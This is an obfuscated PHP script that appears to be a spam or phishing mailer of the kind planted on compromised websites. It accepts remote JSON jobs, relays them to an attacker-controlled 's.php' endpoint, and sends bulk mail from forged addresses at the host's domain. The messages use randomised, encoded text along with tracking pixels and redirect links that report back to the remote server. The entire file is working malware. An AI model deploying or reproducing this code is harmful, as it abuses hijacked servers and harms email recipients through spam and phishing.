<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp692f9f) { if ($sp692f9f == 'keys') { return array_keys($this->_keys); } } public function Import($sp692f9f, $sp3062a1) { if (is_array($sp3062a1)) { $this->values[$sp692f9f] = array(); foreach ($sp3062a1 as $sp8d867f) { if (!empty($sp8d867f['key'])) { $this->values[$sp692f9f][$sp8d867f['key']] = $sp8d867f['value']; } else { $this->values[$sp692f9f][] = $sp8d867f['value']; } } } else { $this->Assign($sp692f9f, $sp3062a1); } } public function Assign($sp692f9f, $sp06df6a) { $this->values[$sp692f9f] = $sp06df6a; } public function Parse($sp3adb83) { $spe9c8f8 = ''; $sp1960a2 = 0; while (true) { $sp697487 = strpos($sp3adb83, '{', $sp1960a2); if ($sp697487 === false) { $spe9c8f8 .= substr($sp3adb83, $sp1960a2); break; } $spe9c8f8 .= substr($sp3adb83, $sp1960a2, $sp697487 - $sp1960a2); $sp1960a2 = $sp697487 + 1; $sp8f4f4d = ''; $spa53fe6 = '{'; $sp790778 = array(); $spe9312e = false; $sp0566cf = false; $sp65f08f = 'var'; while ($sp1960a2 < strlen($sp3adb83)) { $spd5768a = substr($sp3adb83, $sp1960a2, 1); $spa53fe6 .= $spd5768a; if ($spd5768a == ',' || $spd5768a == '>' || $spd5768a == '|') { if ($sp65f08f == 'alias') { $spe9312e = $sp8f4f4d; } elseif ($sp65f08f == 'mod') { $sp0566cf = $sp8f4f4d; } else { $sp790778[] = $sp8f4f4d; } $sp8f4f4d = ''; if ($spd5768a == '>') { $sp65f08f = 'alias'; } if ($spd5768a == '|') { $sp65f08f = 'mod'; } $sp1960a2++; continue; } if ($spd5768a == '}') { if ($sp65f08f == 'alias') { $spe9312e = $sp8f4f4d; } elseif ($sp65f08f == 'mod') { $sp0566cf = $sp8f4f4d; } else { $sp790778[] = $sp8f4f4d; } $sp1960a2++; break; } $sp8f4f4d .= $spd5768a; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spd5768a) == 0) { $sp1960a2++; $sp790778 = array(); break; } $sp1960a2++; } if (sizeof($sp790778) == 0) { $spe9c8f8 .= $spa53fe6; continue; } $sp976a28 = false; $sp429314 = false; if (preg_match('/^\\^/', $sp790778[0]) > 0) { $sp790778[0] = substr($sp790778[0], 1); $sp976a28 = true; } if (preg_match('/^\\!/', $sp790778[0]) > 0) { $sp790778[0] = substr($sp790778[0], 1); $sp429314 = true; } $spb6d382 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp790778[0], $sp132ca1) > 0) { $spb6d382 = $sp132ca1[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp790778[0], $sp132ca1) > 0) { $spb6d382 = explode('-', $sp132ca1[1]); } if ($spb6d382 !== false) { $sp790778[0] = substr($sp790778[0], 0, strpos($sp790778[0], '[')); } $this->_keys[$sp790778[0]] = true; if (empty($this->values[$sp790778[0]]) && empty($this->fixed[$sp790778[0]])) { continue; } if ($sp976a28) { unset($this->fixed[$sp790778[0]]); } if (isset($this->fixed[$sp790778[0]])) { $sp542c09 = $this->fixed[$sp790778[0]]; } else { $sp542c09 = ''; $sp9b36eb = 1; if (sizeof($sp790778) == 2) { $sp9b36eb = $sp790778[1]; } if (sizeof($sp790778) == 3) { $sp9b36eb = rand($sp790778[1], $sp790778[2]); } for ($sp6819ed = 0; $sp6819ed < $sp9b36eb; $sp6819ed++) { if (is_array($this->values[$sp790778[0]])) { if (!is_array($this->used[$sp790778[0]])) { $this->used[$sp790778[0]] = array(); } if (count($this->used[$sp790778[0]]) == count($this->values[$sp790778[0]])) { $this->used[$sp790778[0]] = array(); } if ($spb6d382 !== false && is_scalar($spb6d382)) { $sp542c09 .= $this->values[$sp790778[0]][$spb6d382]; $this->used[$spb6d382] = true; } else { $sp79c37a = array(); if (is_array($spb6d382)) { $spcb57d6 = $spb6d382[0]; $sp22f25c = $spb6d382[1]; } else { $spcb57d6 = 0; $sp22f25c = count($this->values[$sp790778[0]]) - 1; } for ($sp6c8870 = $spcb57d6; $sp6c8870 <= $sp22f25c; $sp6c8870++) { if ($sp429314 && !empty($this->used[$sp790778[0]][$sp6c8870])) { continue; } $sp79c37a[] = $sp6c8870; } $sp5698fe = $sp79c37a[rand(0, count($sp79c37a) - 1)]; $this->used[$sp790778[0]][$sp5698fe] = true; $sp542c09 .= $this->values[$sp790778[0]][$sp5698fe]; } } else { $sp542c09 .= $this->values[$sp790778[0]]; } } } $sp542c09 = $this->Parse($sp542c09); if ($sp0566cf !== false) { for ($sp284c0d = 0; $sp284c0d < strlen($sp0566cf); $sp284c0d++) { switch (substr($sp0566cf, $sp284c0d, 1)) { case 'b': $sp542c09 = base64_encode($sp542c09); break; case 'q': $sp542c09 = quoted_printable_encode($sp542c09); break; default: break; } } } if ($sp976a28) { $this->fixed[$sp790778[0]] = $sp542c09; } if ($spe9312e !== false && $spe9312e != '') { $this->fixed[$spe9312e] = $sp542c09; } $spe9c8f8 .= $sp542c09; } return $spe9c8f8; } } $spdebb7b = file_get_contents('php://input'); $sp2366d3 = json_decode($spdebb7b, true); if (empty($sp2366d3['via_proxy'])) { $sp2366d3['via_proxy'] = true; $sp27ab6e = curl_init($sp2366d3['prefix'] . 's.php'); $sp3b7b20 = json_encode($sp2366d3); curl_setopt($sp27ab6e, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp27ab6e, CURLOPT_TIMEOUT, 600); curl_setopt($sp27ab6e, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp27ab6e, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp27ab6e, CURLOPT_REFERER, $sp040977); curl_setopt($sp27ab6e, CURLOPT_POST, true); curl_setopt($sp27ab6e, CURLOPT_POSTFIELDS, $sp3b7b20); curl_setopt($sp27ab6e, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp3b7b20))); $sp2942d4 = curl_exec($sp27ab6e); echo $sp2942d4; die; } $spa02b0f = $_SERVER['SERVER_ADDR']; $sp7ac9b3 = $_SERVER['HTTP_HOST']; $sp7ac9b3 = preg_replace('/^www\\./', '', $sp7ac9b3); $sp115e96 = new Macros(); $sp115e96->Assign('server_addr', $spa02b0f); $sp115e96->Assign('server_host', $sp7ac9b3); foreach ($sp2366d3['macros'] as $sp692f9f => $sp3062a1) { $sp115e96->Import($sp692f9f, $sp3062a1); } $sp6f90d9 = preg_replace('/^www\\./i', '', $sp7ac9b3); $sp9098f6 = $sp115e96->Parse('{from_user}@' . $sp6f90d9); $sp115e96->Assign('from_email', $sp9098f6); $sp115e96->Assign('prefix', $sp2366d3['prefix']); $sp115e96->Assign('html', $sp2366d3['letter']['html']); $sp1960a2 = 0; $spf65176 = 0; $sp45289a = 0; $sp425064 = array(); foreach ($sp2366d3['rcpt'] as $spa232e2) { $sp115e96->Assign('email', $spa232e2['email']); $sp115e96->Assign('entry', $spa232e2); $sp115e96->Assign('date', date('r')); $sp115e96->Assign('redirect', $sp2366d3['prefix'] . 'r.php?id=' . $spa232e2['id'] . '&uri='); $sp115e96->Assign('unsubscribe', $sp2366d3['prefix'] . 'u.php?id=' . $spa232e2['id']); $sp115e96->Assign('delivery', '<img src="' . $sp2366d3['prefix'] . 'd.php?id=' . $spa232e2['id'] . '" />'); $spc744ad = $sp115e96->Parse($sp2366d3['envelope']['header']); $sp14a739 = $sp115e96->Parse($sp2366d3['envelope']['body']); if (!empty($spa232e2['name'])) { $sp805cc1 = $spa232e2['name'] . ' <' . $spa232e2['email'] . '>'; } else { $sp805cc1 = $spa232e2['email']; } $sp12954f = $sp115e96->Parse($sp2366d3['letter']['subject']); $sp01ac51 = mail($sp805cc1, $sp12954f, $sp14a739, $spc744ad); $sp425064[$spa232e2['id']] = $sp01ac51; if ($sp01ac51) { $spf65176++; } else { $sp45289a++; } $sp1960a2++; } echo serialize(array('total' => count($sp2366d3['rcpt']), 'sent' => $sp1960a2, 'success' => $spf65176, 'error' => $sp45289a, 'rcpt' => $sp425064));